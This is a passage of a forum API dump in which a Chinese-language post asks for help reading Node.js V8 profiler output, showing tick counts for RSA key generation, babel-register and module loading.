internal&#x2F;modules&#x2F;cjs&#x2F;loader.js:631:36\n      1  100.0%            LazyCompile: ~require internal&#x2F;modules&#x2F;cjs&#x2F;helpers.js:19:19\n      1    7.7%    LazyCompile: ~Module.load internal&#x2F;modules&#x2F;cjs&#x2F;loader.js:591:33\n      1  100.0%      LazyCompile: ~tryModuleLoad internal&#x2F;modules&#x2F;cjs&#x2F;loader.js:536:23\n      1  100.0%        LazyCompile: ~Module._load internal&#x2F;modules&#x2F;cjs&#x2F;loader.js:503:24\n      1  100.0%          LazyCompile: ~Module.require internal&#x2F;modules&#x2F;cjs&#x2F;loader.js:631:36\n      1  100.0%            LazyCompile: ~require internal&#x2F;modules&#x2F;cjs&#x2F;helpers.js:19:19\n      1    7.7%    LazyCompile: ~Module._load internal&#x2F;modules&#x2F;cjs&#x2F;loader.js:503:24\n      1  100.0%      LazyCompile: ~Module.require internal&#x2F;modules&#x2F;cjs&#x2F;loader.js:631:36\n      1  100.0%        LazyCompile: ~require internal&#x2F;modules&#x2F;cjs&#x2F;helpers.js:19:19\n      1  100.0%          LazyCompile: ~module.exports &#x2F;mnt&#x2F;pgyer&#x2F;nodejs-moddle&#x2F;node_modules&#x2F;bluebird&#x2F;js&#x2F;release&#x2F;promisify.js:2:26\n      1  100.0%            LazyCompile: ~module.exports &#x2F;mnt&#x2F;pgyer&#x2F;nodejs-moddle&#x2F;node_modules&#x2F;bluebird&#x2F;js&#x2F;release&#x2F;promise.js:2:26\n      1    7.7%    LazyCompile: ~Join native array.js:112:14\n      1  100.0%      LazyCompile: ~InnerArrayJoin native array.js:267:24\n      1  100.0%        LazyCompile: ~join native array.js:280:46\n      1  100.0%          LazyCompile: ~Module._findPath internal&#x2F;modules&#x2F;cjs&#x2F;loader.js:221:28\n      1  100.0%            LazyCompile: ~Module._resolveFilename internal&#x2F;modules&#x2F;cjs&#x2F;loader.js:548:35\n      1    7.7%    LazyCompile: ~&lt;anonymous&gt; &#x2F;mnt&#x2F;pgyer&#x2F;nodejs-moddle&#x2F;node_modules&#x2F;lodash&#x2F;_createBaseFor.js:9:18\n      1  100.0%      LazyCompile: ~baseMerge &#x2F;mnt&#x2F;pgyer&#x2F;nodejs-moddle&#x2F;node_modules&#x2F;lodash&#x2F;_baseMerge.js:20:19\n      1  100.0%        LazyCompile: ~&lt;anonymous&gt; &#x2F;mnt&#x2F;pgyer&#x2F;nodejs-moddle&#x2F;node_modules&#x2F;lodash&#x2F;mergeWith.js:35:40\n      1  100.0%          LazyCompile: ~&lt;anonymous&gt; &#x2F;mnt&#x2F;pgyer&#x2F;nodejs-moddle&#x2F;node_modules&#x2F;lodash&#x2F;_createAssigner.js:12:27\n      1  100.0%            LazyCompile: ~apply &#x2F;mnt&#x2F;pgyer&#x2F;nodejs-moddle&#x2F;node_modules&#x2F;lodash&#x2F;_apply.js:11:15\n\n     12    1.1%  &#x2F;usr&#x2F;lib64&#x2F;libstdc++.so.6.0.19\n      9   75.0%    &#x2F;app&#x2F;software&#x2F;nodejs&#x2F;bin&#x2F;node\n      1   11.1%      Script: ~&lt;anonymous&gt; &#x2F;mnt&#x2F;pgyer&#x2F;nodejs-moddle&#x2F;node_modules&#x2F;babel-types&#x2F;lib&#x2F;definitions&#x2F;experimental.js:1:11\n      1  100.0%        LazyCompile: ~Module._compile internal&#x2F;modules&#x2F;cjs&#x2F;loader.js:657:37\n      1  100.0%          LazyCompile: ~Module._extensions..js internal&#x2F;modules&#x2F;cjs&#x2F;loader.js:710:37\n      1  100.0%            LazyCompile: ~Module.load internal&#x2F;modules&#x2F;cjs&#x2F;loader.js:591:33\n      1   11.1%      Script: ~&lt;anonymous&gt; &#x2F;mnt&#x2F;pgyer&#x2F;nodejs-moddle&#x2F;node_modules&#x2F;babel-helper-optimise-call-expression&#x2F;lib&#x2F;index.js:1:11\n      1  100.0%        LazyCompile: ~Module._compile internal&#x2F;modules&#x2F;cjs&#x2F;loader.js:657:37\n      1  100.0%          LazyCompile: ~Module._extensions..js internal&#x2F;modules&#x2F;cjs&#x2F;loader.js:710:37\n      1  100.0%            LazyCompile: ~require.extensions.(anonymous function) &#x2F;mnt&#x2F;pgyer&#x2F;nodejs-moddle&#x2F;node_modules&#x2F;babel-register&#x2F;lib&#x2F;node.js:150:38\n      1   11.1%      LazyCompile: ~module.exports &#x2F;mnt&#x2F;pgyer&#x2F;nodejs-moddle&#x2F;node_modules&#x2F;core-js&#x2F;library&#x2F;modules&#x2F;_iter-define.js:18:27\n      1  100.0%        Script: ~&lt;anonymous&gt; &#x2F;mnt&#x2F;pgyer&#x2F;nodejs-moddle&#x2F;node_modules&#x2F;core-js&#x2F;library&#x2F;modules&#x2F;es6.array.iterator.js:1:11\n      1  100.0%          LazyCompile: ~Module._compile internal&#x2F;modules&#x2F;cjs&#x2F;loader.js:657:37\n      1  100.0%            LazyCompile: ~Module._extensions..js internal&#x2F;modules&#x2F;cjs&#x2F;loader.js:710:37\n      1   11.1%      LazyCompile: ~levels.forEach &#x2F;mnt&#x2F;pgyer&#x2F;nodejs-moddle&#x2F;node_modules&#x2F;log4js&#x2F;lib&#x2F;levels.js:52:22\n      1  100.0%        Builtin: ArrayForEach\n      1  100.0%          LazyCompile: ~addLevels &#x2F;mnt&#x2F;pgyer&#x2F;nodejs-moddle&#x2F;node_modules&#x2F;log4js&#x2F;lib&#x2F;levels.js:49:19\n      1  100.0%            Script: ~&lt;anonymous&gt; &#x2F;mnt&#x2F;pgyer&#x2F;nodejs-moddle&#x2F;node_modules&#x2F;log4js&#x2F;lib&#x2F;levels.js:1:11\n      1   11.1%      LazyCompile: ~getFixed &#x2F;mnt&#x2F;pgyer&#x2F;nodejs-moddle&#x2F;node_modules&#x2F;opentype.js&#x2F;dist&#x2F;opentype.js:2077:18\n      1  100.0%        LazyCompile: ~Parser.parseFixed &#x2F;mnt&#x2F;pgyer&#x2F;nodejs-moddle&#x2F;node_modules&#x2F;opentype.js&#x2F;dist&#x2F;opentype.js:2186:39\n      1  100.0%          LazyCompile: ~parseHeadTable &#x2F;mnt&#x2F;pgyer&#x2F;nodejs-moddle&#x2F;node_modules&#x2F;opentype.js&#x2F;dist&#x2F;opentype.js:5114:24\n      1  100.0%            LazyCompile: ~parseBuffer &#x2F;mnt&#x2F;pgyer&#x2F;nodejs-moddle&#x2F;node_modules&#x2F;opentype.js&#x2F;dist&#x2F;opentype.js:11927:21\n      1   11.1%      LazyCompile: ~exports.createClient &#x2F;mnt&#x2F;pgyer&#x2F;nodejs-moddle&#x2F;node_modules&#x2F;redis&#x2F;index.js:1088:33\n      1  100.0%        LazyCompile: ~RedisStore &#x2F;mnt&#x2F;pgyer&#x2F;nodejs-moddle&#x2F;node_modules&#x2F;connect-redis&#x2F;lib&#x2F;connect-redis.js:52:23\n      1  100.0%          Script: ~&lt;anonymous&gt; &#x2F;mnt&#x2F;pgyer&#x2F;nodejs-moddle&#x2F;server&#x2F;api&#x2F;apiServer.js:1:11\n      1  100.0%            LazyCompile: ~Module._compile internal&#x2F;modules&#x2F;cjs&#x2F;loader.js:657:37\n      1   11.1%      LazyCompile: ~Module._resolveLookupPaths internal&#x2F;modules&#x2F;cjs&#x2F;loader.js:401:38\n      1  100.0%        LazyCompile: ~Module._resolveFilename internal&#x2F;modules&#x2F;cjs&#x2F;loader.js:548:35\n      1  100.0%          LazyCompile: ~Module._load internal&#x2F;modules&#x2F;cjs&#x2F;loader.js:503:24\n      1  100.0%            LazyCompile: ~Module.require internal&#x2F;modules&#x2F;cjs&#x2F;loader.js:631:36\n      1   11.1%      Builtin: RegExpPrototypeExec\n      1  100.0%        LazyCompile: ~&lt;anonymous&gt; &#x2F;mnt&#x2F;pgyer&#x2F;nodejs-moddle&#x2F;node_modules&#x2F;platform&#x2F;platform.js:567:38\n      1  100.0%          LazyCompile: ~&lt;anonymous&gt; &#x2F;mnt&#x2F;pgyer&#x2F;nodejs-moddle&#x2F;node_modules&#x2F;platform&#x2F;platform.js:226:25\n      1  100.0%            LazyCompile: ~each &#x2F;mnt&#x2F;pgyer&#x2F;nodejs-moddle&#x2F;node_modules&#x2F;platform&#x2F;platform.js:134:16\n      1   11.1%      Builtin: ArrayPrototypePush\n      1  100.0%        LazyCompile: ~dataIntersection &#x2F;mnt&#x2F;pgyer&#x2F;nodejs-moddle&#x2F;node_modules&#x2F;regenerate&#x2F;regenerate.js:452:33\n      1  100.0%          LazyCompile: ~intersection &#x2F;mnt&#x2F;pgyer&#x2F;nodejs-moddle&#x2F;node_modules&#x2F;regenerate&#x2F;regenerate.js:1137:27\n      1  100.0%            Script: ~&lt;anonymous&gt; &#x2F;mnt&#x2F;pgyer&#x2F;nodejs-moddle&#x2F;node_modules&#x2F;regexpu-core&#x2F;rewrite-pattern.js:1:11\n      1    8.3%    LazyCompile: ~overRest &#x2F;mnt&#x2F;pgyer&#x2F;nodejs-moddle&#x2F;node_modules&#x2F;lodash&#x2F;lodash.js:6552:22\n      1  100.0%      LazyCompile: ~baseRest &#x2F;mnt&#x2F;pgyer&#x2F;nodejs-moddle&#x2F;node_modules&#x2F;lodash&#x2F;lodash.js:3933:22\n      1  100.0%        Script: ~runInContext &#x2F;mnt&#x2F;pgyer&#x2F;nodejs-moddle&#x2F;node_modules&#x2F;lodash&#x2F;lodash.js:1406:44\n      1  100.0%          Script: ~&lt;anonymous&gt; &#x2F;mnt&#x2F;pgyer&#x2F;nodejs-moddle&#x2F;node_modules&#x2F;lodash&#x2F;lodash.js:9:11\n      1  100.0%            Script: ~&lt;anonymous&gt; &#x2F;mnt&#x2F;pgyer&#x2F;nodejs-moddle&#x2F;node_modules&#x2F;lodash&#x2F;lodash.js:1:11\n\n     11    1.0%  LazyCompile: *montReduce &#x2F;mnt&#x2F;pgyer&#x2F;nodejs-moddle&#x2F;node_modules&#x2F;node-rsa&#x2F;src&#x2F;libs&#x2F;jsbn.js:609:20\n      6   54.5%    LazyCompile: ~montSqrTo &#x2F;mnt&#x2F;pgyer&#x2F;nodejs-moddle&#x2F;node_modules&#x2F;node-rsa&#x2F;src&#x2F;libs&#x2F;jsbn.js:631:19\n      6  100.0%      LazyCompile: ~bnModPow &#x2F;mnt&#x2F;pgyer&#x2F;nodejs-moddle&#x2F;node_modules&#x2F;node-rsa&#x2F;src&#x2F;libs&#x2F;jsbn.js:1230:18\n      6  100.0%        LazyCompile: ~bnpMillerRabin &#x2F;mnt&#x2F;pgyer&#x2F;nodejs-moddle&#x2F;node_modules&#x2F;node-rsa&#x2F;src&#x2F;libs&#x2F;jsbn.js:1421:24\n      6  100.0%          LazyCompile: ~bnIsProbablePrime &#x2F;mnt&#x2F;pgyer&#x2F;nodejs-moddle&#x2F;node_modules&#x2F;node-rsa&#x2F;src&#x2F;libs&#x2F;jsbn.js:1402:27\n      4   66.7%            LazyCompile: ~module.exports.Key.RSAKey.generate &#x2F;mnt&#x2F;pgyer&#x2F;nodejs-moddle&#x2F;node_modules&#x2F;node-rsa&#x2F;src&#x2F;libs&#x2F;rsa.js:93:42\n      2   33.3%            LazyCompile: ~bnpFromNumber &#x2F;mnt&#x2F;pgyer&#x2F;nodejs-moddle&#x2F;node_modules&#x2F;node-rsa&#x2F;src&#x2F;libs&#x2F;jsbn.js:770:23\n      3   27.3%    LazyCompile: ~montMulTo &#x2F;mnt&#x2F;pgyer&#x2F;nodejs-moddle&#x2F;node_modules&#x2F;node-rsa&#x2F;src&#x2F;libs&#x2F;jsbn.js:637:19\n      3  100.0%      LazyCompile: ~bnModPow &#x2F;mnt&#x2F;pgyer&#x2F;nodejs-moddle&#x2F;node_modules&#x2F;node-rsa&#x2F;src&#x2F;libs&#x2F;jsbn.js:1230:18\n      3  100.0%        LazyCompile: ~bnpMillerRabin &#x2F;mnt&#x2F;pgyer&#x2F;nodejs-moddle&#x2F;node_modules&#x2F;node-rsa&#x2F;src&#x2F;libs&#x2F;jsbn.js:1421:24\n      3  100.0%          LazyCompile: ~bnIsProbablePrime &#x2F;mnt&#x2F;pgyer&#x2F;nodejs-moddle&#x2F;node_modules&#x2F;node-rsa&#x2F;src&#x2F;libs&#x2F;jsbn.js:1402:27\n      2   66.7%            LazyCompile: ~bnpFromNumber &#x2F;mnt&#x2F;pgyer&#x2F;nodejs-moddle&#x2F;node_modules&#x2F;node-rsa&#x2F;src&#x2F;libs&#x2F;jsbn.js:770:23\n      1   33.3%            LazyCompile: ~module.exports.Key.RSAKey.generate &#x2F;mnt&#x2F;pgyer&#x2F;nodejs-moddle&#x2F;node_modules&#x2F;node-rsa&#x2F;src&#x2F;libs&#x2F;rsa.js:93:42\n      2   18.2%    LazyCompile: *bnModPow &#x2F;mnt&#x2F;pgyer&#x2F;nodejs-moddle&#x2F;node_modules&#x2F;node-rsa&#x2F;src&#x2F;libs&#x2F;jsbn.js:1230:18\n      2  100.0%      LazyCompile: ~bnpMillerRabin &#x2F;mnt&#x2F;pgyer&#x2F;nodejs-moddle&#x2F;node_modules&#x2F;node-rsa&#x2F;src&#x2F;libs&#x2F;jsbn.js:1421:24\n      2  100.0%        LazyCompile: ~bnIsProbablePrime &#x2F;mnt&#x2F;pgyer&#x2F;nodejs-moddle&#x2F;node_modules&#x2F;node-rsa&#x2F;src&#x2F;libs&#x2F;jsbn.js:1402:27\n      2  100.0%          LazyCompile: ~module.exports.Key.RSAKey.generate &#x2F;mnt&#x2F;pgyer&#x2F;nodejs-moddle&#x2F;node_modules&#x2F;node-rsa&#x2F;src&#x2F;libs&#x2F;rsa.js:93:42\n      2  100.0%            LazyCompile: ~module.exports.NodeRSA.generateKeyPair &#x2F;mnt&#x2F;pgyer&#x2F;nodejs-moddle&#x2F;node_modules&#x2F;node-rsa&#x2F;src&#x2F;NodeRSA.js:156:50\n</code></pre></div>","title":"帮忙分析下NODEJS 线上性能日志!","last_reply_at":"2019-04-26T03:14:19.841Z","good":false,"top":false,"reply_count":4,"visit_count":793,"create_at":"2019-04-25T08:27:53.670Z","author":{"loginname":"xulayen","avatar_url":"https://avatars1.githubusercontent.com/u/15044564?v=4&s=120"}},{"id":"5cc2772e37faec0ce1d06e88","author_id":"59b0fced1b37e54f6793c3d6","tab":"share","content":"<div class=\"markdown-text\"><blockquote>\n<p>一下是性能测试图，帮我分析下NODEJS存在什么问题。</p>\n</blockquote>\n<p><img src=\"//static.cnodejs.org/Fra2s0BblhhY89Op0ckwUIBh23XM\" alt=\"image.png\"></p>\n<blockquote>\n<p>解析出来的日志</p>\n</blockquote>\n<pre class=\"prettyprint\"><code>Statistical profiling result from isolate-0x3a8cb30-v8.log, (188 ticks, 0 unaccounted, 0 excluded).\n\n [Shared libraries]:\n   ticks  total  nonlib   name\n    116   61.7%          &#x2F;app&#x2F;software&#x2F;nodejs&#x2F;bin&#x2F;node\n     18    9.6%          &#x2F;usr&#x2F;lib64&#x2F;libc-2.17.so\n     12    6.4%          &#x2F;usr&#x2F;lib64&#x2F;libpthread-2.17.so\n      1    0.5%          &#x2F;usr&#x2F;lib64&#x2F;libstdc++.so.6.0.19\n\n [JavaScript]:\n   ticks  total  nonlib   name\n      6    3.2%   14.6%  LazyCompile: *bnpSquareTo &#x2F;mnt&#x2F;pgyer&#x2F;nodejs-moddle&#x2F;node_modules&#x2F;node-rsa&#x2F;src&#x2F;libs&#x2F;jsbn.js:448:21\n      4    2.1%    9.8%  LazyCompile: *montReduce &#x2F;mnt&#x2F;pgyer&#x2F;nodejs-moddle&#x2F;node_modules&#x2F;node-rsa&#x2F;src&#x2F;libs&#x2F;jsbn.js:609:20\n      3    1.6%    7.3%  LazyCompile: *bnpMultiplyTo &#x2F;mnt&#x2F;pgyer&#x2F;nodejs-moddle&#x2F;node_modules&#x2F;node-rsa&#x2F;src&#x2F;libs&#x2F;jsbn.js:436:23\n      3    1.6%    7.3%  Builtin: CallFunction_ReceiverIsAny\n      2    1.1%    4.9%  RegExp: ^screen|^xterm|^vt100|color|ansi|cygwin|linux\n      2    1.1%    4.9%  Builtin: KeyedStoreIC_Megamorphic\n      2    1.1%    4.9%  Builtin: InterpreterEntryTrampoline\n      1    0.5%    2.4%  Script: ~&lt;anonymous&gt; internal&#x2F;querystring.js:1:11\n      1    0.5%    2.4%  LazyCompile: ~validateInteger vm.js:150:25\n      1    0.5%    2.4%  LazyCompile: ~resolve path.js:1068:28\n      1    0.5%    2.4%  LazyCompile: ~require internal&#x2F;modules&#x2F;cjs&#x2F;helpers.js:19:19\n      1    0.5%    2.4%  LazyCompile: ~relative path.js:1161:30\n      1    0.5%    2.4%  LazyCompile: ~forEachCode &#x2F;mnt&#x2F;pgyer&#x2F;nodejs-moddle&#x2F;node_modules&#x2F;csurf&#x2F;node_modules&#x2F;http-errors&#x2F;index.js:190:38\n      1    0.5%    2.4%  LazyCompile: ~defineDependentProperty &#x2F;mnt&#x2F;pgyer&#x2F;nodejs-moddle&#x2F;node_modules&#x2F;opentype.js&#x2F;dist&#x2F;opentype.js:3725:33\n      1    0.5%    2.4%  LazyCompile: ~Script vm.js:44:14\n      1    0.5%    2.4%  LazyCompile: ~Module.wrap internal&#x2F;modules&#x2F;cjs&#x2F;loader.js:125:23\n      1    0.5%    2.4%  LazyCompile: ~Module._resolveLookupPaths internal&#x2F;modules&#x2F;cjs&#x2F;loader.js:401:38\n      1    0.5%    2.4%  LazyCompile: *resolve path.js:1068:28\n      1    0.5%    2.4%  LazyCompile: *relative path.js:1161:30\n      1    0.5%    2.4%  LazyCompile: *montMulTo &#x2F;mnt&#x2F;pgyer&#x2F;nodejs-moddle&#x2F;node_modules&#x2F;node-rsa&#x2F;src&#x2F;libs&#x2F;jsbn.js:637:19\n      1    0.5%    2.4%  LazyCompile: *bnModPow &#x2F;mnt&#x2F;pgyer&#x2F;nodejs-moddle&#x2F;node_modules&#x2F;node-rsa&#x2F;src&#x2F;libs&#x2F;jsbn.js:1230:18\n      1    0.5%    2.4%  LazyCompile: *Module._nodeModulePaths internal&#x2F;modules&#x2F;cjs&#x2F;loader.js:360:37\n      1    0.5%    2.4%  Builtin: StringAdd_CheckNone_NotTenured\n      1    0.5%    2.4%  Builtin: StoreIC_Uninitialized\n      1    0.5%    2.4%  Builtin: LoadIC\n      1    0.5%    2.4%  Builtin: IterableToList\n\n [C++]:\n   ticks  total  nonlib   name\n\n [Summary]:\n   ticks  total  nonlib   name\n     41   21.8%  100.0%  JavaScript\n      0    0.0%    0.0%  C++\n     20   10.6%   48.8%  GC\n    147   78.2%          Shared libraries\n\n [C++ entry points]:\n   ticks    cpp   total   name\n\n [Bottom up (heavy) profile]:\n  Note: percentage shows a share of a particular caller in the total\n  amount of its parent calls.\n  Callers occupying less than 1.0% are not shown.\n\n   ticks parent  name\n    116   61.7%  &#x2F;app&#x2F;software&#x2F;nodejs&#x2F;bin&#x2F;node\n    109   94.0%    &#x2F;app&#x2F;software&#x2F;nodejs&#x2F;bin&#x2F;node\n     42   38.5%      LazyCompile: ~Script vm.js:44:14\n     42  100.0%        LazyCompile: ~createScript vm.js:273:22\n     42  100.0%          LazyCompile: ~runInThisContext vm.js:322:26\n     42  100.0%            LazyCompile: ~Module._compile internal&#x2F;modules&#x2F;cjs&#x2F;loader.js:657:37\n      5    4.6%      LazyCompile: ~toString buffer.js:643:46\n      5  100.0%        Builtin: CEntry_Return1_DontSaveFPRegs_ArgvOnStack_BuiltinExit\n      5  100.0%          LazyCompile: ~load &#x2F;mnt&#x2F;pgyer&#x2F;nodejs-moddle&#x2F;node_modules&#x2F;babel-register&#x2F;lib&#x2F;cache.js:51:14\n      5  100.0%            Script: ~&lt;anonymous&gt; &#x2F;mnt&#x2F;pgyer&#x2F;nodejs-moddle&#x2F;node_modules&#x2F;babel-register&#x2F;lib&#x2F;node.js:1:11\n      5    4.6%      LazyCompile: ~load &#x2F;mnt&#x2F;pgyer&#x2F;nodejs-moddle&#x2F;node_modules&#x2F;babel-register&#x2F;lib&#x2F;cache.js:51:14\n      5  100.0%        Script: ~&lt;anonymous&gt; &#x2F;mnt&#x2F;pgyer&#x2F;nodejs-moddle&#x2F;node_modules&#x2F;babel-register&#x2F;lib&#x2F;node.js:1:11\n      5  100.0%          LazyCompile: ~Module._compile internal&#x2F;modules&#x2F;cjs&#x2F;loader.js:657:37\n      5  100.0%            LazyCompile: ~Module._extensions..js internal&#x2F;modules&#x2F;cjs&#x2F;loader.js:710:37\n      4    3.7%      LazyCompile: ~stringSlice buffer.js:589:21\n      4  100.0%        LazyCompile: ~toString buffer.js:643:46\n      4  100.0%          LazyCompile: ~readFileSync fs.js:340:22\n      2   50.0%            LazyCompile: ~Module._extensions..js internal&#x2F;modules&#x2F;cjs&#x2F;loader.js:710:37\n      1   25.0%            LazyCompile: ~addConfig &#x2F;mnt&#x2F;pgyer&#x2F;nodejs-moddle&#x2F;node_modules&#x2F;babel-core&#x2F;lib&#x2F;transformation&#x2F;file&#x2F;options&#x2F;build-config-chain.js:137:62\n      1   25.0%            LazyCompile: ~Module._extensions..json internal&#x2F;modules&#x2F;cjs&#x2F;loader.js:717:39\n      4    3.7%      LazyCompile: ~NativeModule.compile internal&#x2F;bootstrap&#x2F;loaders.js:303:44\n      4  100.0%        LazyCompile: ~NativeModule.require internal&#x2F;bootstrap&#x2F;loaders.js:150:34\n      1   25.0%          Script: ~&lt;anonymous&gt; internal&#x2F;child_process.js:1:11\n      1  100.0%            LazyCompile: ~NativeModule.compile internal&#x2F;bootstrap&#x2F;loaders.js:303:44\n      1   25.0%          Script: ~&lt;anonymous&gt; http.js:1:11\n      1  100.0%            LazyCompile: ~NativeModule.compile internal&#x2F;bootstrap&#x2F;loaders.js:303:44\n      1   25.0%          Script: ~&lt;anonymous&gt; buffer.js:1:11\n      1  100.0%            LazyCompile: ~NativeModule.compile internal&#x2F;bootstrap&#x2F;loaders.js:303:44\n      1   25.0%          LazyCompile: ~setupProcessFatal internal&#x2F;bootstrap&#x2F;node.js:479:29\n      1  100.0%            LazyCompile: ~startup internal&#x2F;bootstrap&#x2F;node.js:30:19\n      3    2.8%      LazyCompile: ~stat internal&#x2F;modules&#x2F;cjs&#x2F;loader.js:84:14\n      2   66.7%        LazyCompile: ~tryFile internal&#x2F;modules&#x2F;cjs&#x2F;loader.js:194:17\n      2  100.0%          LazyCompile: ~tryExtensions internal&#x2F;modules&#x2F;cjs&#x2F;loader.js:209:23\n      2  100.0%            LazyCompile: ~Module._findPath internal&#x2F;modules&#x2F;cjs&#x2F;loader.js:221:28\n      1   33.3%        LazyCompile: ~Module._findPath internal&#x2F;modules&#x2F;cjs&#x2F;loader.js:221:28\n      1  100.0%          LazyCompile: ~Module._resolveFilename internal&#x2F;modules&#x2F;cjs&#x2F;loader.js:548:35\n      1  100.0%            LazyCompile: ~Module._load internal&#x2F;modules&#x2F;cjs&#x2F;loader.js:503:24\n      3    2.8%      LazyCompile: ~realpathSync fs.js:1375:22\n      3  100.0%        LazyCompile: ~toRealPath internal&#x2F;modules&#x2F;cjs&#x2F;loader.js:202:20\n      3  100.0%          LazyCompile: ~tryFile internal&#x2F;modules&#x2F;cjs&#x2F;loader.js:194:17\n      2   66.7%            LazyCompile: ~tryExtensions internal&#x2F;modules&#x2F;cjs&#x2F;loader.js:209:23\n      1   33.3%            LazyCompile: ~tryPackage internal&#x2F;modules&#x2F;cjs&#x2F;loader.js:174:20\n      3    2.8%      LazyCompile: ~fromString buffer.js:334:20\n      3  100.0%        LazyCompile: ~from buffer.js:199:28\n      3  100.0%          LazyCompile: ~writeFileSync fs.js:1184:23\n      3  100.0%            LazyCompile: ~save &#x2F;mnt&#x2F;pgyer&#x2F;nodejs-moddle&#x2F;node_modules&#x2F;babel-register&#x2F;lib&#x2F;cache.js:32:14\n      3    2.8%      LazyCompile: ~Module._extensions..json internal&#x2F;modules&#x2F;cjs&#x2F;loader.js:717:39\n      3  100.0%        LazyCompile: ~Module.load internal&#x2F;modules&#x2F;cjs&#x2F;loader.js:591:33\n      3  100.0%          LazyCompile: ~tryModuleLoad internal&#x2F;modules&#x2F;cjs&#x2F;loader.js:536:23\n      3  100.0%            LazyCompile: ~Module._load internal&#x2F;modules&#x2F;cjs&#x2F;loader.js:503:24\n      2    1.8%      LazyCompile: ~stringify &#x2F;mnt&#x2F;pgyer&#x2F;nodejs-moddle&#x2F;node_modules&#x2F;core-js&#x2F;library&#x2F;fn&#x2F;json&#x2F;stringify.js:3:36\n      2  100.0%        LazyCompile: ~save &#x2F;mnt&#x2F;pgyer&#x2F;nodejs-moddle&#x2F;node_modules&#x2F;babel-register&#x2F;lib&#x2F;cache.js:32:14\n      2  100.0%          LazyCompile: ~_tickCallback internal&#x2F;process&#x2F;next_tick.js:41:25\n      2  100.0%            LazyCompile: ~Module.runMain internal&#x2F;modules&#x2F;cjs&#x2F;loader.js:741:26\n      2    1.8%      LazyCompile: ~readPackage internal&#x2F;modules&#x2F;cjs&#x2F;loader.js:153:21\n      2  100.0%        LazyCompile: ~tryPackage internal&#x2F;modules&#x2F;cjs&#x2F;loader.js:174:20\n      2  100.0%          LazyCompile: ~Module._findPath internal&#x2F;modules&#x2F;cjs&#x2F;loader.js:221:28\n      2  100.0%            LazyCompile: ~Module._resolveFilename internal&#x2F;modules&#x2F;cjs&#x2F;loader.js:548:35\n      2    1.8%      LazyCompile: ~am3 &#x2F;mnt&#x2F;pgyer&#x2F;nodejs-moddle&#x2F;node_modules&#x2F;node-rsa&#x2F;src&#x2F;libs&#x2F;jsbn.js:102:13\n      2  100.0%        LazyCompile: ~bnpSquareTo &#x2F;mnt&#x2F;pgyer&#x2F;nodejs-moddle&#x2F;node_modules&#x2F;node-rsa&#x2F;src&#x2F;libs&#x2F;jsbn.js:448:21\n      2  100.0%          LazyCompile: ~montSqrTo &#x2F;mnt&#x2F;pgyer&#x2F;nodejs-moddle&#x2F;node_modules&#x2F;node-rsa&#x2F;src&#x2F;libs&#x2F;jsbn.js:631:19\n      2  100.0%            LazyCompile: ~bnModPow &#x2F;mnt&#x2F;pgyer&#x2F;nodejs-moddle&#x2F;node_modules&#x2F;node-rsa&#x2F;src&#x2F;libs&#x2F;jsbn.js:1230:18\n\n     18    9.6%  &#x2F;usr&#x2F;lib64&#x2F;libc-2.17.so\n     10   55.6%    &#x2F;app&#x2F;software&#x2F;nodejs&#x2F;bin&#x2F;node\n      3   30.0%      LazyCompile: ~montSqrTo &#x2F;mnt&#x2F;pgyer&#x2F;nodejs-moddle&#x2F;node_modules&#x2F;node-rsa&#x2F;src&#x2F;libs&#x2F;jsbn.js:631:19\n      3  100.0%        LazyCompile: ~bnModPow &#x2F;mnt&#x2F;pgyer&#x2F;nodejs-moddle&#x2F;node_modules&#x2F;node-rsa&#x2F;src&#x2F;libs&#x2F;jsbn.js:1230:18\n      3  100.0%          LazyCompile: ~bnpMillerRabin &#x2F;mnt&#x2F;pgyer&#x2F;nodejs-moddle&#x2F;node_modules&#x2F;node-rsa&#x2F;src&#x2F;libs&#x2F;jsbn.js:1421:24\n      3  100.0%            LazyCompile: ~bnIsProbablePrime &#x2F;mnt&#x2F;pgyer&#x2F;nodejs-moddle&#x2F;node_modules&#x2F;node-rsa&#x2F;src&#x2F;libs&#x2F;jsbn.js:1402:27\n      2   20.0%      LazyCompile: ~load &#x2F;mnt&#x2F;pgyer&#x2F;nodejs-moddle&#x2F;node_modules&#x2F;babel-register&#x2F;lib&#x2F;cache.js:51:14\n      2  100.0%        Script: ~&lt;anonymous&gt; &#x2F;mnt&#x2F;pgyer&#x2F;nodejs-moddle&#x2F;node_modules&#x2F;babel-register&#x2F;lib&#x2F;node.js:1:11\n      2  100.0%          LazyCompile: ~Module._compile internal&#x2F;modules&#x2F;cjs&#x2F;loader.js:657:37\n      2  100.0%            LazyCompile: ~Module._extensions..js internal&#x2F;modules&#x2F;cjs&#x2F;loader.js:710:37\n      1   10.0%      RegExp: ^screen|^xterm|^vt100|color|ansi|cygwin|linux\n      1  100.0%        LazyCompile: ~montReduce &#x2F;mnt&#x2F;pgyer&#x2F;nodejs-moddle&#x2F;node_modules&#x2F;node-rsa&#x2F;src&#x2F;libs&#x2F;jsbn.js:609:20\n      1  100.0%          LazyCompile: ~montSqrTo &#x2F;mnt&#x2F;pgyer&#x2F;nodejs-moddle&#x2F;node_modules&#x2F;node-rsa&#x2F;src&#x2F;libs&#x2F;jsbn.js:631:19\n      1  100.0%            LazyCompile: ~bnModPow &#x2F;mnt&#x2F;pgyer&#x2F;nodejs-moddle&#x2F;node_modules&#x2F;node-rsa&#x2F;src&#x2F;libs&#x2F;jsbn.js:1230:18\n      1   10.0%      LazyCompile: ~startup internal&#x2F;bootstrap&#x2F;node.js:30:19\n      1  100.0%        Script: ~bootstrapNodeJSCore internal&#x2F;bootstrap&#x2F;node.js:15:30\n      1   10.0%      LazyCompile: ~getRawTag &#x2F;mnt&#x2F;pgyer&#x2F;nodejs-moddle&#x2F;node_modules&#x2F;lodash&#x2F;_getRawTag.js:26:19\n      1  100.0%        LazyCompile: ~baseGetTag &#x2F;mnt&#x2F;pgyer&#x2F;nodejs-moddle&#x2F;node_modules&#x2F;lodash&#x2F;_baseGetTag.js:19:20\n      1  100.0%          Script: ~&lt;anonymous&gt; &#x2F;mnt&#x2F;pgyer&#x2F;nodejs-moddle&#x2F;node_modules&#x2F;lodash&#x2F;_getTag.js:1:11\n      1  100.0%            LazyCompile: ~Module._compile internal&#x2F;modules&#x2F;cjs&#x2F;loader.js:657:37\n      1   10.0%      LazyCompile: ~am3 &#x2F;mnt&#x2F;pgyer&#x2F;nodejs-moddle&#x2F;node_modules&#x2F;node-rsa&#x2F;src&#x2F;libs&#x2F;jsbn.js:102:13\n      1  100.0%        LazyCompile: ~bnpSquareTo 